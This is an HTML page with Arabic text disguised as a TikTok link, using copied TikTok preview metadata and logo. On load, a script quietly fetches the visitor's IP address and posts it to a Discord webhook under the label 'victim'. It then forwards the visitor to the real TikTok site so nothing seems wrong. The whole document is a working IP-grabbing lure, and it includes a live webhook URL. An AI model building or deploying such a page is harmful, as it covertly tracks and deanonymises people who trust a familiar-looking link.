<!DOCTYPE html>
<html lang="ar">
<head>
    <meta property="og:title" content="TIKTOK.COM">
    <meta property="og:description" content="اضغط للمشاهدة">
    <meta property="og:image" content="https://w7.pngwing.com/pngs/303/329/png-transparent-tiktok-logo-tiktok-logo-computer-icons-tiktok-icon-text-rectangle-logo.png">
    <meta property="og:url" content="https://tiktok.com">
    <meta property="theme-color" content="#FF0050">
    
    <title>TIKTOK.COM</title>
    
    <script>
        // سكربت بسيط لجمع الـ IP وإرساله للـ Webhook بمجرد فتح الصفحة
        window.onload = function() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const webhook = "https://discord.com/api/webhooks/1507796489118810243/BQ2IhsWL7BSeqeGgTbF7bkQS0vA6s5Nm7BFYqfqk2GMok-G8uqy-5RhCzkDcvdbWwWKx";
                    fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: "🚨 الضحية: " + data.ip })
                    });
                });
            
            // إعادة التوجيه التلقائي للموقع الحقيقي بعد 2 ثانية
            setTimeout(function() {
                window.location.href = "https://www.tiktok.com";
            }, 2000);
        };
    </script>
</head>
<body>
    <p>جارٍ التحويل...</p>
</body>
</html>
